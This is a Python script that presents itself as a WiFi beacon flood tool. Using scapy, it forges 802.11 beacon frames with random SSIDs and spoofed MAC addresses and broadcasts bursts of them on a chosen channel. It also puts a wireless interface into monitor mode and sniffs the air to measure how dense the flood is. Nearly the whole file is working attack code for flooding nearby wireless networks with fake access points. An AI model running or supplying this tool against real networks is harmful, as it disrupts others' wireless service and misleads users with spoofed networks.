#!/usr/bin/env python3
"""WiFi Beacon Flood Tool — generates and analyzes 802.11 beacon frames."""

import subprocess
import sys
import time
import random
import string
import struct

try:
    from scapy.all import (
        RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp, sniff, conf
    )
except ImportError:
    sys.exit("scapy required: pip install scapy")


def random_mac():
    """Generate a random MAC address."""
    return ":".join(f"{random.randint(0, 255):02x}" for _ in range(6))


def random_ssid(length=10):
    """Generate a random SSID string."""
    return "".join(random.choices(string.ascii_letters + string.digits, k=length))


def build_beacon(ssid, mac=None, channel=1):
    """Build a single 802.11 beacon frame."""
    mac = mac or random_mac()
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",
                  addr2=mac, addr3=mac)
    beacon = Dot11Beacon(cap="ESS+privacy")
    essid = Dot11Elt(ID="SSID", info=ssid.encode(), len=len(ssid))
    channel_elt = Dot11Elt(ID="DSset", info=struct.pack("B", channel))
    rates = Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24")
    return RadioTap() / dot11 / beacon / essid / channel_elt / rates


def flood_beacons(interface, count=50, channel=6, delay=0.05):
    """Send a burst of beacon frames with random SSIDs."""
    print(f"[*] Sending {count} beacon frames on channel {channel}")
    set_channel(interface, channel)
    for i in range(count):
        ssid = random_ssid(random.randint(5, 20))
        pkt = build_beacon(ssid, channel=channel)
        sendp(pkt, iface=interface, verbose=False)
        time.sleep(delay)
    print(f"[+] Flood complete — {count} beacons sent")


def set_channel(interface, channel):
    """Set the wireless interface to a specific channel."""
    subprocess.run(["iwconfig", interface, "channel", str(channel)],
                   capture_output=True)


def set_monitor_mode(interface):
    """Enable monitor mode via airmon-ng."""
    print(f"[*] Enabling monitor mode on {interface}")
    subprocess.run(["airmon-ng", "start", interface], capture_output=True)
    return f"{interface}mon"


def capture_beacons(interface, duration=10):
    """Sniff beacon frames for a given duration."""
    print(f"[*] Capturing beacons for {duration}s on {interface}")
    beacons = []

    def handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            ssid = pkt[Dot11Elt].info.decode(errors="replace")
            bssid = pkt[Dot11].addr2
            beacons.append({"ssid": ssid, "bssid": bssid,
                            "time": time.time()})

    sniff(iface=interface, prn=handler, timeout=duration, store=False)
    print(f"[+] Captured {len(beacons)} beacon frames")
    return beacons


def analyze_flood_impact(beacons):
    """Analyze captured beacons to measure flood density."""
    if not beacons:
        return {"unique_ssids": 0, "unique_bssids": 0, "rate": 0}
    ssids = {b["ssid"] for b in beacons}
    bssids = {b["bssid"] for b in beacons}
    duration = beacons[-1]["time"] - beacons[0]["time"] if len(beacons) > 1 else 1
    return {
        "unique_ssids": len(ssids),
        "unique_bssids": len(bssids),
        "total": len(beacons),
        "rate": len(beacons) / max(duration, 0.1),
    }


def get_interface_info(interface):
    """Return iwconfig output for the interface."""
    result = subprocess.run(["iwconfig", interface], capture_output=True, text=True)
    return result.stdout


if __name__ == "__main__":
    print("WiFi Beacon Flood Tool — companion to the web dashboard")
    print("Usage: sudo python3 wifi_tool.py <interface>")
    if len(sys.argv) > 1:
        iface = sys.argv[1]
        print(get_interface_info(iface))
